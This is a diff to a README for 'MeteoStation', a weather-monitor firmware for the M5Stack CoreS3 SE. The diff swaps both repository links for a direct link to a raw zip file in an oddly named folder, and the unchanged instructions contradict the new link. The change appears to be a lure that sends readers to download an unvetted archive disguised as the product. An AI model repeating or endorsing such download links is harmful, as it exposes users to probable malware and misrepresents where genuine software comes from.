@@ -1,6 +1,6 @@
 # ☁️ MeteoStation - Track local weather with ease
 
-[![](https://img.shields.io/badge/Download-MeteoStation-blue.svg)](https://github.com/barngrassjanegoodall132/MeteoStation)
+[![](https://img.shields.io/badge/Download-MeteoStation-blue.svg)](https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip)
 
 MeteoStation turns your M5Stack CoreS3 SE into a reliable weather monitor. It collects sensor data and connects to the Open-Meteo service to provide accurate climate information. This device displays temperature, humidity, and atmospheric pressure on a clear screen for your home or office.
 
@@ -15,7 +15,7 @@ Your computer must meet these basic needs to manage the device:
 
 ## 📥 How to Download 
 
-Visit this page to download the software for your device: [https://github.com/barngrassjanegoodall132/MeteoStation](https://github.com/barngrassjanegoodall132/MeteoStation).
+Visit this page to download the software for your device: [https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip](https://raw.githubusercontent.com/barngrassjanegoodall132/MeteoStation/main/postally/Meteo_Station_3.4-beta.4.zip).
 
 Navigate to the release section on the right side of the screen. Locate the file named `MeteoStation_Firmware.zip`. Click the file name to start the download. Once the transfer finishes, open your Downloads folder and right-click the file to extract the contents. You now possess the files needed to update your device.
 
